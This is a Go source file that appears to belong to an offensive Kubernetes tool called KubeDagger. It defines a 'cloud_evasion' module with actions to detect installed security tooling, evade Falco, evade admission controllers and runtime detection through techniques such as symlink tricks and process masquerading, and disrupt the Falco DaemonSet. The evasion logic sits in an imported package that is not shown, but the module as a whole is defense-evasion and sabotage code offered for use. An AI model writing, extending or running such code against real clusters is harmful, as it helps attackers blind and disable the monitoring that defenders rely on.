package modules

import (
	"context"
	"fmt"

	"github.com/yasindce1998/KubeDagger/pkg/cloudevasion"
)

type CloudEvasion struct{}

func (m *CloudEvasion) Name() string      { return "cloud_evasion" }
func (m *CloudEvasion) Platform() []string { return []string{"linux", "windows", "darwin"} }

func (m *CloudEvasion) Execute(ctx context.Context, args map[string]string) (*Result, error) {
	action := args["action"]
	if action == "" {
		action = "detect"
	}

	switch action {
	case "detect":
		return m.detect(ctx)
	case "falco":
		return m.evadeFalco(ctx, args)
	case "admission":
		return m.evadeAdmission(ctx, args)
	case "runtime":
		return m.evadeRuntime(ctx, args)
	case "disrupt":
		return m.disrupt(ctx)
	default:
		return &Result{Success: false, Error: fmt.Sprintf("unknown action: %s", action)}, nil
	}
}

func (m *CloudEvasion) detect(ctx context.Context) (*Result, error) {
	systems, err := cloudevasion.DetectSystems(ctx)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	return &Result{
		Success: true,
		Output:  cloudevasion.FormatSystems(systems),
	}, nil
}

func (m *CloudEvasion) evadeFalco(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "symlink"
	}

	result, err := cloudevasion.EvadeFalco(ctx, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) evadeAdmission(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "enumerate"
	}

	result, err := cloudevasion.EvadeAdmissionControllers(ctx, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) evadeRuntime(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "process_masquerade"
	}

	result, err := cloudevasion.EvadeRuntimeDetection(ctx, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) disrupt(ctx context.Context) (*Result, error) {
	result, err := cloudevasion.DisruptFalcoDaemonSet(ctx)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	return &Result{Success: result.Success, Output: result.Output}, nil
}
